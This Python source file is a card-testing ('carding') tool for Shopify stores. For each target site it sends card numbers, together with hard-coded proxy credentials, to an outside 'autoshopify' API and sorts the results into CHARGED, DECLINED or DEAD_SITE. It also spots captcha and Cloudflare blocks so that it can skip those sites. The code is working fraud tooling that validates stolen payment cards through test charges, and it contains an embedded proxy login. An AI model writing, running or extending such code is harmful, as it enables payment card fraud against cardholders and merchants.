import aiohttp
import asyncio
import json
import re
import time

AUTOSH_BASE = "https://autoshopify.stormx.pw/index.php"
DEFAULT_PROXY = "pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
TIMEOUT = 30

def is_dead_site_response(response: str):
    """Check if response indicates dead site"""
    dead_patterns = [
        "HCAPTCHA DETECTED",
        "CLINTE TOKEN",
        "DEL AMMOUNT EMPTY", 
        "PRODUCT ID IS EMPTY",
        "PY ID EMPTY",
        "TAX AMMOUNT EMPTY",
        "R4 TOKEN EMPTY",
        "Receipt ID is empty",
        "Invalid API response",
        "site not working",
        "captcha detected",
        "hcaptcha",
        "cloudflare",
        "churiiu63"
    ]
    
    response_upper = str(response).upper()
    return any(pattern.upper() in response_upper for pattern in dead_patterns)

async def check_shopify_card(card: str, site: str):
    """Single card check for Shopify"""
    start_time = time.time()
    try:
        api_url = f"{AUTOSH_BASE}?site={site}&cc={card}&proxy={DEFAULT_PROXY}"
        
        timeout = aiohttp.ClientTimeout(total=TIMEOUT)
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=timeout) as resp:
                api_text = await resp.text()
            
        elapsed_time = round(time.time() - start_time, 2)
        
        if is_dead_site_response(api_text):
            return {
                "status": "DEAD_SITE",
                "price": "0",
                "message": "DEAD_SITE",
                "elapsed": elapsed_time
            }
        
        json_match = re.search(r'\{[^}]*\}', api_text)
        if json_match:
            json_str = json_match.group()
            try:
                data = json.loads(json_str)
                response = data.get("Response", "Unknown")
                price = data.get("Price", "0")
                
                status = "CHARGED" if "APPROVED" in response.upper() else "DECLINED"
                return {
                    "status": status,
                    "price": price,
                    "message": response,
                    "elapsed": elapsed_time
                }
                
            except json.JSONDecodeError:
                pass
        
        return {
            "status": "DECLINED",
            "price": "0",
            "message": "Processing Error",
            "elapsed": elapsed_time
        }
        
    except asyncio.TimeoutError:
        elapsed_time = round(time.time() - start_time, 2)
        return {
            "status": "TIMEOUT",
            "price": "0",
            "message": f"Timeout - {TIMEOUT}s",
            "elapsed": elapsed_time
        }
        
    except Exception as e:
        elapsed_time = round(time.time() - start_time, 2)
        return {
            "status": "ERROR",
            "price": "0",
            "message": f"Error: {str(e)[:30]}",
            "elapsed": elapsed_time
        }

